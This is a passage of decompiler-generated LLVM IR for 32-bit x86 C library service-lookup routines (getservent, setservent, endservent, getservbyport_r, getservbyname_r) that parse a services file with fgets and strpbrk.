  %v0_8064f2a = load i32, i32* %stack_var_-60, align 4
  %v1_8064f2a = call i32 @__errno_location(i32 %v0_8064f2a)
  store i32 %v1_8064f2a, i32* %eax.global-to-local, align 4
  store i32 5, i32* @ebx, align 4
  %v1_8064f34 = inttoptr i32 %v1_8064f2a to i32*
  store i32 5, i32* %v1_8064f34, align 4
  br label %dec_label_pc_8065032

dec_label_pc_8064f5d:                             ; preds = %dec_label_pc_8064f3f.preheader, %dec_label_pc_8064f3f.backedge
  %v3_8064f4f41 = phi i32 [ %v3_8064f4f, %dec_label_pc_8064f3f.backedge ], [ %v3_8064f4f38, %dec_label_pc_8064f3f.preheader ]
  %v1_8064f5d = inttoptr i32 %v3_8064f4f41 to i8*
  %v2_8064f5d = load i8, i8* %v1_8064f5d, align 1
  %v11_8064f5d = icmp eq i8 %v2_8064f5d, 35
  br i1 %v11_8064f5d, label %dec_label_pc_8064f3f.backedge, label %dec_label_pc_8064f62

dec_label_pc_8064f3f.backedge:                    ; preds = %dec_label_pc_8064f5d, %dec_label_pc_8064f62, %dec_label_pc_8064f76, %dec_label_pc_8064fa2
  %v0_8064f40.pre = load i32, i32* @global_var_807e044.763, align 4
  store i32 %v1_8064ed5, i32* %stack_var_-60, align 4
  %v3_8064f4f = call i32 @fgets(i32 %v1_8064ed5, i32 4096, i32 %v0_8064f40.pre)
  store i32 %v3_8064f4f, i32* %eax.global-to-local, align 4
  %v1_8064f57 = icmp eq i32 %v3_8064f4f, 0
  store i32 %v3_8064f4f, i32* @ebx, align 4
  br i1 %v1_8064f57, label %dec_label_pc_8064f2a, label %dec_label_pc_8064f5d

dec_label_pc_8064f62:                             ; preds = %dec_label_pc_8064f5d
  store i32 %v3_8064f4f41, i32* %stack_var_-60, align 4
  %v3_8064f6a = call i32 @__GI_strpbrk(i8* %v1_8064f5d, i32 ptrtoint ([3 x i8]* @global_var_806f096.766 to i32))
  store i32 %v3_8064f6a, i32* %eax.global-to-local, align 4
  %v1_8064f72 = icmp eq i32 %v3_8064f6a, 0
  br i1 %v1_8064f72, label %dec_label_pc_8064f3f.backedge, label %dec_label_pc_8064f76

dec_label_pc_8064f76:                             ; preds = %dec_label_pc_8064f62
  %v1_8064f76 = inttoptr i32 %v3_8064f6a to i8*
  store i8 0, i8* %v1_8064f76, align 1
  %v0_8064f79 = load i32, i32* @ebx, align 4
  %v1_8064f79 = load i32, i32* @edi, align 4
  %v2_8064f79 = inttoptr i32 %v1_8064f79 to i32*
  store i32 %v0_8064f79, i32* %v2_8064f79, align 4
  %v0_8064f82 = load i32, i32* @ebx, align 4
  store i32 %v0_8064f82, i32* %stack_var_-60, align 4
  %v2_8064f83 = inttoptr i32 %v0_8064f82 to i8*
  %v3_8064f83 = call i32 @__GI_strpbrk(i8* %v2_8064f83, i32 ptrtoint ([3 x i8]* @global_var_806f099.767 to i32))
  store i32 %v3_8064f83, i32* %eax.global-to-local, align 4
  %v1_8064f8b = icmp eq i32 %v3_8064f83, 0
  br i1 %v1_8064f8b, label %dec_label_pc_8064f3f.backedge, label %dec_label_pc_8064f8f

dec_label_pc_8064f8f:                             ; preds = %dec_label_pc_8064f76
  %v1_8064f8f = add i32 %v3_8064f83, 1
  store i32 %v1_8064f8f, i32* @esi, align 4
  %v1_8064f92 = inttoptr i32 %v3_8064f83 to i8*
  store i8 0, i8* %v1_8064f92, align 1
  %v0_8064f98.pre = load i32, i32* @esi, align 4
  %v4_8064f98.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064f98

dec_label_pc_8064f97:                             ; preds = %dec_label_pc_8064f9e, %dec_label_pc_8064f98
  %v1_8064f97 = add i32 %v0_8064f97, 1
  store i32 %v1_8064f97, i32* @esi, align 4
  br label %dec_label_pc_8064f98

dec_label_pc_8064f98:                             ; preds = %dec_label_pc_8064f8f, %dec_label_pc_8064f97
  %v4_8064f98 = phi i32 [ %v4_8064f98.pre, %dec_label_pc_8064f8f ], [ %v6_8064f98, %dec_label_pc_8064f97 ]
  %v0_8064f97 = phi i32 [ %v0_8064f98.pre, %dec_label_pc_8064f8f ], [ %v1_8064f97, %dec_label_pc_8064f97 ]
  %v1_8064f98 = inttoptr i32 %v0_8064f97 to i8*
  %v2_8064f98 = load i8, i8* %v1_8064f98, align 1
  %v3_8064f98 = zext i8 %v2_8064f98 to i32
  %v5_8064f98 = and i32 %v4_8064f98, -256
  %v6_8064f98 = or i32 %v3_8064f98, %v5_8064f98
  store i32 %v6_8064f98, i32* %eax.global-to-local, align 4
  %v7_8064f9a = icmp eq i8 %v2_8064f98, 32
  br i1 %v7_8064f9a, label %dec_label_pc_8064f97, label %dec_label_pc_8064f9e

dec_label_pc_8064f9e:                             ; preds = %dec_label_pc_8064f98
  %v10_8064f9e = icmp eq i8 %v2_8064f98, 9
  br i1 %v10_8064f9e, label %dec_label_pc_8064f97, label %dec_label_pc_8064fa2

dec_label_pc_8064fa2:                             ; preds = %dec_label_pc_8064f9e
  store i32 %v0_8064f97, i32* %stack_var_-60, align 4
  %v3_8064faa = call i32 @__GI_strpbrk(i8* %v1_8064f98, i32 ptrtoint ([3 x i8]* @global_var_806f09c.768 to i32))
  store i32 %v3_8064faa, i32* %eax.global-to-local, align 4
  %v1_8064fb2 = icmp eq i32 %v3_8064faa, 0
  br i1 %v1_8064fb2, label %dec_label_pc_8064f3f.backedge, label %dec_label_pc_8064fb6

dec_label_pc_8064fb6:                             ; preds = %dec_label_pc_8064fa2
  %v1_8064fb9 = inttoptr i32 %v3_8064faa to i8*
  store i8 0, i8* %v1_8064fb9, align 1
  %v0_8064fbc = load i32, i32* %eax.global-to-local, align 4
  %v1_8064fbc = add i32 %v0_8064fbc, 1
  store i32 %v1_8064fbc, i32* @ebx, align 4
  %v0_8064fbf = load i32, i32* @esi, align 4
  store i32 %v0_8064fbf, i32* %stack_var_-60, align 4
  %v1_8064fc0 = call i32 @atol(i32 %v0_8064fbf)
  %v0_8064fc6 = load i32, i32* @ebp, align 4
  store i32 %v0_8064fc6, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_806f09c.768 to i32), i32* %edx.global-to-local, align 4
  %v0_8064fc9 = load i32, i32* @ebx, align 4
  %v1_8064fc9 = load i32, i32* @edi, align 4
  %v2_8064fc9 = add i32 %v1_8064fc9, 12
  %v3_8064fc9 = inttoptr i32 %v2_8064fc9 to i32*
  store i32 %v0_8064fc9, i32* %v3_8064fc9, align 4
  %v0_8064fcc = load i32, i32* @ebp, align 4
  %v1_8064fcc = load i32, i32* @edi, align 4
  %v2_8064fcc = add i32 %v1_8064fcc, 4
  %v3_8064fcc = inttoptr i32 %v2_8064fcc to i32*
  store i32 %v0_8064fcc, i32* %v3_8064fcc, align 4
  %v1_8064fd2 = trunc i32 %v1_8064fc0 to i16
  %v2_8064fd2 = call i16 @llvm.bswap.i16(i16 %v1_8064fd2)
  %v3_8064fd2 = zext i16 %v2_8064fd2 to i32
  store i32 %v3_8064fd2, i32* %eax.global-to-local, align 4
  %v1_8064fd9 = load i32, i32* @edi, align 4
  %v2_8064fd9 = add i32 %v1_8064fd9, 8
  %v3_8064fd9 = inttoptr i32 %v2_8064fd9 to i32*
  store i32 %v3_8064fd2, i32* %v3_8064fd9, align 4
  %v0_8064fe1 = load i32, i32* @ebx, align 4
  store i32 %v0_8064fe1, i32* %stack_var_-60, align 4
  %v2_8064fe2 = inttoptr i32 %v0_8064fe1 to i8*
  %v3_8064fe2 = call i32 @__GI_strpbrk(i8* %v2_8064fe2, i32 ptrtoint ([3 x i8]* @global_var_806f099.767 to i32))
  store i32 %v3_8064fe2, i32* %eax.global-to-local, align 4
  %v1_806501035 = icmp eq i32 %v3_8064fe2, 0
  store i32 %v3_8064fe2, i32* %edx.global-to-local, align 4
  br i1 %v1_806501035, label %dec_label_pc_8065024, label %dec_label_pc_8065016

dec_label_pc_8064fe9:                             ; preds = %dec_label_pc_806501e
  %v7_8064fe9 = icmp eq i8 %v2_806501e, 32
  br i1 %v7_8064fe9, label %dec_label_pc_8065019.backedge, label %dec_label_pc_8064fed

dec_label_pc_8065019.backedge:                    ; preds = %dec_label_pc_8064fe9, %dec_label_pc_8064fed
  %v1_8065019 = add i32 %v1_806501934, 1
  %v8_8065019 = icmp eq i32 %v1_8065019, 0
  store i32 %v1_8065019, i32* %edx.global-to-local, align 4
  br i1 %v8_8065019, label %dec_label_pc_8065024, label %dec_label_pc_806501e

dec_label_pc_8064fed:                             ; preds = %dec_label_pc_8064fe9
  %v10_8064fed = icmp eq i8 %v2_806501e, 9
  br i1 %v10_8064fed, label %dec_label_pc_8065019.backedge, label %dec_label_pc_8064ff1

dec_label_pc_8064ff1:                             ; preds = %dec_label_pc_8064fed
  %v0_8064ff1 = load i32, i32* @ebp, align 4
  %v1_8064ff1 = add i32 %v0_8064ff1, 136
  store i32 %v1_8064ff1, i32* %eax.global-to-local, align 4
  %v0_8064ff7 = load i32, i32* @esi, align 4
  %v7_8064ff7 = icmp ult i32 %v0_8064ff7, %v1_8064ff1
  %v1_8064ff9 = icmp eq i1 %v7_8064ff7, false
  br i1 %v1_8064ff9, label %dec_label_pc_8065000, label %dec_label_pc_8064ffb

dec_label_pc_8064ffb:                             ; preds = %dec_label_pc_8064ff1
  %v2_8064ffb = inttoptr i32 %v0_8064ff7 to i32*
  store i32 %v1_806501934, i32* %v2_8064ffb, align 4
  %v0_8064ffd = load i32, i32* @esi, align 4
  %v1_8064ffd = add i32 %v0_8064ffd, 4
  store i32 %v1_8064ffd, i32* @esi, align 4
  %v0_8065007.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8065000

dec_label_pc_8065000:                             ; preds = %dec_label_pc_8064ff1, %dec_label_pc_8064ffb
  %v0_8065007 = phi i32 [ %v1_806501934, %dec_label_pc_8064ff1 ], [ %v0_8065007.pre, %dec_label_pc_8064ffb ]
  store i32 %v0_8065007, i32* %stack_var_-60, align 4
  %v2_8065008 = inttoptr i32 %v0_8065007 to i8*
  %v3_8065008 = call i32 @__GI_strpbrk(i8* %v2_8065008, i32 ptrtoint ([3 x i8]* @global_var_806f099.767 to i32))
  store i32 %v3_8065008, i32* %eax.global-to-local, align 4
  %v1_8065010 = icmp eq i32 %v3_8065008, 0
  store i32 %v3_8065008, i32* %edx.global-to-local, align 4
  br i1 %v1_8065010, label %dec_label_pc_8065024, label %dec_label_pc_8065016

dec_label_pc_8065016:                             ; preds = %dec_label_pc_8064fb6, %dec_label_pc_8065000
  %v0_806501637 = phi i32 [ %v3_8065008, %dec_label_pc_8065000 ], [ %v3_8064fe2, %dec_label_pc_8064fb6 ]
  %v1_8065016 = inttoptr i32 %v0_806501637 to i8*
  store i8 0, i8* %v1_8065016, align 1
  %v0_8065019.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_806501931 = add i32 %v0_8065019.pre, 1
  %v8_806501932 = icmp eq i32 %v1_806501931, 0
  store i32 %v1_806501931, i32* %edx.global-to-local, align 4
  br i1 %v8_806501932, label %dec_label_pc_8065024, label %dec_label_pc_806501e.lr.ph

dec_label_pc_806501e.lr.ph:                       ; preds = %dec_label_pc_8065016
  %v4_806501e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806501e

dec_label_pc_806501e:                             ; preds = %dec_label_pc_806501e.lr.ph, %dec_label_pc_8065019.backedge
  %v4_806501e = phi i32 [ %v4_806501e.pre, %dec_label_pc_806501e.lr.ph ], [ %v6_806501e, %dec_label_pc_8065019.backedge ]
  %v1_806501934 = phi i32 [ %v1_806501931, %dec_label_pc_806501e.lr.ph ], [ %v1_8065019, %dec_label_pc_8065019.backedge ]
  %v1_806501e = inttoptr i32 %v1_806501934 to i8*
  %v2_806501e = load i8, i8* %v1_806501e, align 1
  %v3_806501e = zext i8 %v2_806501e to i32
  %v5_806501e = and i32 %v4_806501e, -256
  %v6_806501e = or i32 %v5_806501e, %v3_806501e
  store i32 %v6_806501e, i32* %eax.global-to-local, align 4
  %v4_8065020 = icmp eq i8 %v2_806501e, 0
  %v1_8065022 = icmp eq i1 %v4_8065020, false
  br i1 %v1_8065022, label %dec_label_pc_8064fe9, label %dec_label_pc_8065024

dec_label_pc_8065024:                             ; preds = %dec_label_pc_8064fb6, %dec_label_pc_8065000, %dec_label_pc_8065016, %dec_label_pc_8065019.backedge, %dec_label_pc_806501e
  %v0_8065024 = load i32, i32* @esi, align 4
  %v1_8065024 = inttoptr i32 %v0_8065024 to i32*
  store i32 0, i32* %v1_8065024, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v0_8065030 = load i32, i32* @edi, align 4
  store i32 %v0_8065030, i32* %v1_8064e97, align 4
  br label %dec_label_pc_8065032

dec_label_pc_8065032:                             ; preds = %dec_label_pc_8064f2a, %dec_label_pc_8064eef, %dec_label_pc_8065024
  store i32 %v2_8064ebf, i32* %eax.global-to-local, align 4
  store i32 %v2_8064ebf, i32* %stack_var_-60, align 4
  %v3_806503b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_806503b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065043

dec_label_pc_8065043:                             ; preds = %dec_label_pc_8064e9f, %dec_label_pc_8065032
  %v0_8065046 = load i32, i32* @ebx, align 4
  store i32 %v0_8065046, i32* %eax.global-to-local, align 4
  store i32 %v0_8064e7d, i32* @ebx, align 4
  store i32 %v0_8064e7c, i32* @esi, align 4
  store i32 %v0_8064e7b, i32* @edi, align 4
  store i32 %v0_8064e7a, i32* @ebp, align 4
  ret i32 %v0_8065046

; uselistorder directives
  uselistorder i32 %v6_806501e, { 1, 0 }
  uselistorder i8 %v2_806501e, { 2, 3, 1, 0 }
  uselistorder i32 %v1_806501934, { 3, 2, 1, 0 }
  uselistorder i32 %v3_8065008, { 0, 3, 2, 1 }
  uselistorder i32 %v0_8065007, { 1, 0 }
  uselistorder i32 %v6_8064f98, { 1, 0 }
  uselistorder i32 %v0_8064f97, { 0, 2, 1 }
  uselistorder i32 %v3_8064f83, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8064f4f, { 1, 2, 3, 0 }
  uselistorder i32 %v3_8064f4f41, { 1, 0 }
  uselistorder i32 %v1_8064ed5, { 4, 3, 0, 1, 2 }
  uselistorder i32* %stack_var_-60, { 2, 3, 4, 5, 6, 7, 8, 9, 1, 0, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 1, 3, 0, 6, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 5, 23, 24, 4, 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 22, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 (i32)* @atol, { 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 9, { 0, 1, 3, 2 }
  uselistorder i32 140, { 3, 0, 2, 1 }
  uselistorder i32 %arg4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8065043, { 1, 0 }
  uselistorder label %dec_label_pc_8065032, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8065024, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8065016, { 1, 0 }
  uselistorder label %dec_label_pc_8065000, { 1, 0 }
  uselistorder label %dec_label_pc_8065019.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8064f98, { 1, 0 }
  uselistorder label %dec_label_pc_8064f3f.backedge, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8064f5d, { 1, 0 }
  uselistorder label %dec_label_pc_8064f2a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8064f3f.preheader, { 1, 0 }
}

define i32 @getservent() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8065050 = call i32 @__initbuf()
  %v2_8065055 = ptrtoint i32* %stack_var_-4 to i32
  %v0_806505f = load i32, i32* @global_var_807e040.761, align 64
  %v5_806506a = call i32 @getservent_r(i32* nonnull @global_var_807e048.769, i32 %v0_806505f, i32 4237, i32 %v2_8065055)
  %v3_806506f = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_806506f
}

define i32 @__GI_endservent() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8065077 = load i32, i32* @ebx, align 4
  store i32 %v0_8065077, i32* %stack_var_-4, align 4
  %v2_8065085 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8065085, i32* @ebx, align 4
  %v4_806508a = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-20, i32 134589241, i32 ptrtoint (i32* @global_var_8075664.762 to i32))
  %v1_8065096 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075664.762 to i32))
  %v0_806509b = load i32, i32* @global_var_807e044.763, align 4
  %v1_80650a3 = icmp eq i32 %v0_806509b, 0
  br i1 %v1_80650a3, label %dec_label_pc_80650bd, label %dec_label_pc_80650a7

dec_label_pc_80650a7:                             ; preds = %entry
  %v1_80650ab = inttoptr i32 %v0_806509b to i16*
  %v2_80650ab = call i32 @__GI_fclose(i16* %v1_80650ab)
  store i32 0, i32* @global_var_807e044.763, align 4
  br label %dec_label_pc_80650bd

dec_label_pc_80650bd:                             ; preds = %entry, %dec_label_pc_80650a7
  store i8 0, i8* @global_var_807e058.770, align 8
  %v3_80650c9 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-20, i32 1)
  %v2_80650d1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80650d1, i32* @ebx, align 4
  ret i32 %v3_80650c9

; uselistorder directives
  uselistorder label %dec_label_pc_80650bd, { 1, 0 }
}

define i32 @setservent(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v4_80650e5 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-16, i32 134589241, i32 ptrtoint (i32* @global_var_8075664.762 to i32))
  %v1_80650f1 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075664.762 to i32))
  %v0_80650f6 = load i32, i32* @global_var_807e044.763, align 4
  store i32 %v0_80650f6, i32* @eax, align 4
  %v1_80650fe = icmp eq i32 %v0_80650f6, 0
  %v1_8065100 = icmp eq i1 %v1_80650fe, false
  br i1 %v1_8065100, label %dec_label_pc_806511a, label %dec_label_pc_8065102

dec_label_pc_8065102:                             ; preds = %entry
  %v2_806510e = call i32 @__GI_fopen(i32 ptrtoint ([14 x i8]* @global_var_806f088.765 to i32), i32 ptrtoint (i32* @global_var_806f0d1.764 to i32))
  store i32 %v2_806510e, i32* @global_var_807e044.763, align 4
  br label %dec_label_pc_8065123

dec_label_pc_806511a:                             ; preds = %entry
  %v1_806511e = inttoptr i32 %v0_80650f6 to i16*
  %v2_806511e = call i32 @__GI_rewind(i16* %v1_806511e)
  br label %dec_label_pc_8065123

dec_label_pc_8065123:                             ; preds = %dec_label_pc_8065102, %dec_label_pc_806511a
  %v4_8065126 = icmp eq i32 %arg1, 0
  br i1 %v4_8065126, label %dec_label_pc_8065134, label %dec_label_pc_806512d

dec_label_pc_806512d:                             ; preds = %dec_label_pc_8065123
  store i8 1, i8* @global_var_807e058.770, align 8
  br label %dec_label_pc_8065134

dec_label_pc_8065134:                             ; preds = %dec_label_pc_8065123, %dec_label_pc_806512d
  %v3_806513d = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-16, i32 1)
  ret i32 %v3_806513d

; uselistorder directives
  uselistorder i32* @global_var_807e044.763, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_8065134, { 1, 0 }
  uselistorder label %dec_label_pc_8065123, { 1, 0 }
}

define i32 @__GI_getservbyport_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %tmp4 = ptrtoint i32* %arg6 to i32
  %stack_var_-32 = alloca i32, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %tmp4, i32* @ebp, align 4
  %v4_8065168 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134589241, i32 ptrtoint (i32* @global_var_8075664.762 to i32))
  %v1_8065174 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075664.762 to i32))
  %v0_8065179 = load i8, i8* @global_var_807e058.770, align 8
  %v1_8065179 = sext i8 %v0_8065179 to i32
  %v1_8065183 = call i32 @setservent(i32 %v1_8065179)
  %v1_8065196 = icmp eq i32 %arg2, 0
  br label %dec_label_pc_80651ac

dec_label_pc_806518d:                             ; preds = %dec_label_pc_80651ac
  store i32 %arg1, i32* @eax, align 4
  %v0_8065191 = load i32, i32* @esi, align 4
  %v1_8065191 = add i32 %v0_8065191, 8
  %v2_8065191 = inttoptr i32 %v1_8065191 to i32*
  %v3_8065191 = load i32, i32* %v2_8065191, align 4
  %v15_8065191 = icmp eq i32 %v3_8065191, %arg1
  %v1_8065194 = icmp eq i1 %v15_8065191, false
  br i1 %v1_8065194, label %dec_label_pc_80651ac, label %dec_label_pc_8065196

dec_label_pc_8065196:                             ; preds = %dec_label_pc_806518d
  br i1 %v1_8065196, label %dec_label_pc_80651c4, label %dec_label_pc_806519a

dec_label_pc_806519a:                             ; preds = %dec_label_pc_8065196
  %v1_806519d = add i32 %v0_8065191, 12
  %v2_806519d = inttoptr i32 %v1_806519d to i32*
  %v3_806519d = load i32, i32* %v2_806519d, align 4
  %v3_80651a0 = inttoptr i32 %v3_806519d to i8*
  %v4_80651a0 = call i32 @__GI_strcoll(i8* %v3_80651a0, i32 %arg2, i32 %arg1)
  %v1_80651a8 = icmp eq i32 %v4_80651a0, 0
  br i1 %v1_80651a8, label %dec_label_pc_80651c4, label %dec_label_pc_80651ac

dec_label_pc_80651ac:                             ; preds = %dec_label_pc_806519a, %dec_label_pc_806518d, %entry
  %v0_80651ac = load i32, i32* @ebp, align 4
  %v0_80651b5 = load i32, i32* @esi, align 4
  %v4_80651b6 = inttoptr i32 %v0_80651b5 to i32*
  %v5_80651b6 = call i32 @getservent_r(i32* %v4_80651b6, i32 %arg4, i32 %arg5, i32 %v0_80651ac)
  %v1_80651be = icmp eq i32 %v5_80651b6, 0
  store i32 %v5_80651b6, i32* @ebx, align 4
  br i1 %v1_80651be, label %dec_label_pc_806518d, label %dec_label_pc_80651c4

dec_label_pc_80651c4:                             ; preds = %dec_label_pc_806519a, %dec_label_pc_8065196, %dec_label_pc_80651ac
  %v0_80651c4 = load i8, i8* @global_var_807e058.770, align 8
  %v1_80651c4 = icmp eq i8 %v0_80651c4, 0
  %v1_80651cb = icmp eq i1 %v1_80651c4, false
  br i1 %v1_80651cb, label %dec_label_pc_80651d2, label %dec_label_pc_80651cd

dec_label_pc_80651cd:                             ; preds = %dec_label_pc_80651c4
  %v0_80651cd = call i32 @__GI_endservent()
  br label %dec_label_pc_80651d2

dec_label_pc_80651d2:                             ; preds = %dec_label_pc_80651c4, %dec_label_pc_80651cd
  %v3_80651db = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v0_80651e5 = load i32, i32* @ebp, align 4
  %v1_80651e5 = inttoptr i32 %v0_80651e5 to i32*
  %v2_80651e5 = load i32, i32* %v1_80651e5, align 4
  %v3_80651e5 = icmp eq i32 %v2_80651e5, 0
  %v1_80651e9 = icmp eq i1 %v3_80651e5, false
  %v2_80651e9 = load i32, i32* @ebx, align 4
  %v4_80651e9 = select i1 %v1_80651e9, i32 0, i32 %v2_80651e9
  ret i32 %v4_80651e9

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80651d2, { 1, 0 }
  uselistorder label %dec_label_pc_80651c4, { 2, 0, 1 }
}

define i32 @__GI_getservbyport(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80651f9 = call i32 @__initbuf()
  %v0_806520a = load i32, i32* @global_var_807e040.761, align 64
  %v9_806521d = call i32 @__GI_getservbyport_r(i32 %arg1, i32 %arg2, i32 ptrtoint (i32* @global_var_807e048.769 to i32), i32 %v0_806520a, i32 4237, i32* nonnull %stack_var_-4, i32 %v0_80651f9, i32 %v0_80651f9)
  %v3_8065222 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8065222

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @getservbyname_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %tmp19 = ptrtoint i32* %arg3 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_806522a = load i32, i32* @ebp, align 4
  %v0_806522b = load i32, i32* @edi, align 4
  %v0_806522c = load i32, i32* @esi, align 4
  %v0_806522d = load i32, i32* @ebx, align 4
  store i32 %v0_806522d, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %tmp19, i32* @edi, align 4
  %v4_8065248 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134589241, i32 ptrtoint (i32* @global_var_8075664.762 to i32))
  %v1_8065254 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075664.762 to i32))
  %v0_8065259 = load i8, i8* @global_var_807e058.770, align 8
  %v1_8065259 = sext i8 %v0_8065259 to i32
  %v1_8065263 = call i32 @setservent(i32 %v1_8065259)
  %v3_8065275 = inttoptr i32 %arg1 to i8*
  %v1_80652a4 = icmp eq i32 %arg2, 0
  br label %dec_label_pc_80652ba

dec_label_pc_806526d:                             ; preds = %dec_label_pc_80652ba
  %v0_806526d = load i32, i32* @ecx, align 4
  %v0_806526f = load i32, i32* @edi, align 4
  %v1_806526f = inttoptr i32 %v0_806526f to i32*
  %v2_806526f = load i32, i32* %v1_806526f, align 4
  %v4_8065275 = call i32 @__GI_strcoll(i8* %v3_8065275, i32 %v2_806526f, i32 %v0_806526d)
  store i32 %v4_8065275, i32* @eax, align 4
  %v1_806527d = icmp eq i32 %v4_8065275, 0
  br i1 %v1_806527d, label %dec_label_pc_80652a4, label %dec_label_pc_8065281

dec_label_pc_8065281:                             ; preds = %dec_label_pc_806526d
  %v0_8065281 = load i32, i32* @edi, align 4
  %v1_8065281 = add i32 %v0_8065281, 4
  %v2_8065281 = inttoptr i32 %v1_8065281 to i32*
  %v3_8065281 = load i32, i32* %v2_8065281, align 4
  store i32 %v3_8065281, i32* @ebx, align 4
  %v1_806529c1 = inttoptr i32 %v3_8065281 to i32*
  %v2_806529c2 = load i32, i32* %v1_806529c1, align 4
  store i32 %v2_806529c2, i32* @eax, align 4
  %v1_806529e3 = icmp eq i32 %v2_806529c2, 0
  %v1_80652a010 = icmp eq i1 %v1_806529e3, false
  br i1 %v1_80652a010, label %dec_label_pc_8065286, label %dec_label_pc_80652ba

dec_label_pc_8065286:                             ; preds = %dec_label_pc_8065281, %dec_label_pc_8065299
  %v2_806529c11 = phi i32 [ %v2_806529c, %dec_label_pc_8065299 ], [ %v2_806529c2, %dec_label_pc_8065281 ]
  %v0_8065286 = load i32, i32* @edx, align 4
  %v4_806528d = call i32 @__GI_strcoll(i8* %v3_8065275, i32 %v2_806529c11, i32 %v0_8065286)
  store i32 %v4_806528d, i32* @eax, align 4
  %v1_8065295 = icmp eq i32 %v4_806528d, 0
  br i1 %v1_8065295, label %dec_label_pc_80652a4, label %dec_label_pc_8065299

dec_label_pc_8065299:                             ; preds = %dec_label_pc_8065286
  %v0_8065299 = load i32, i32* @ebx, align 4
  %v1_8065299 = add i32 %v0_8065299, 4
  store i32 %v1_8065299, i32* @ebx, align 4
  %v1_806529c = inttoptr i32 %v1_8065299 to i32*
  %v2_806529c = load i32, i32* %v1_806529c, align 4
  store i32 %v2_806529c, i32* @eax, align 4
  %v1_806529e = icmp eq i32 %v2_806529c, 0
  %v1_80652a0 = icmp eq i1 %v1_806529e, false
  br i1 %v1_80652a0, label %dec_label_pc_8065286, label %dec_label_pc_80652ba

dec_label_pc_80652a4:                             ; preds = %dec_label_pc_8065286, %dec_label_pc_806526d
  br i1 %v1_80652a4, label %dec_label_pc_80652d5, label %dec_label_pc_80652a8

dec_label_pc_80652a8:                             ; preds = %dec_label_pc_80652a4
  %v0_80652ab = load i32, i32* @edi, align 4
  %v1_80652ab = add i32 %v0_80652ab, 12
  %v2_80652ab = inttoptr i32 %v1_80652ab to i32*
  %v3_80652ab = load i32, i32* %v2_80652ab, align 4
  %v3_80652ae = inttoptr i32 %v3_80652ab to i8*
  %v4_80652ae = call i32 @__GI_strcoll(i8* %v3_80652ae, i32 0, i32 0)
  %v1_80652b6 = icmp eq i32 %v4_80652ae, 0
  br i1 %v1_80652b6, label %dec_label_pc_80652d5, label %dec_label_pc_80652ba

dec_label_pc_80652ba:                             ; preds = %dec_label_pc_8065299, %dec_label_pc_8065281, %dec_label_pc_80652a8, %entry
  %v0_80652c6 = load i32, i32* @edi, align 4
  %v4_80652c7 = inttoptr i32 %v0_80652c6 to i32*
  %v5_80652c7 = call i32 @getservent_r(i32* %v4_80652c7, i32 %arg4, i32 %arg5, i32 %arg6)
  store i32 %v5_80652c7, i32* @eax, align 4
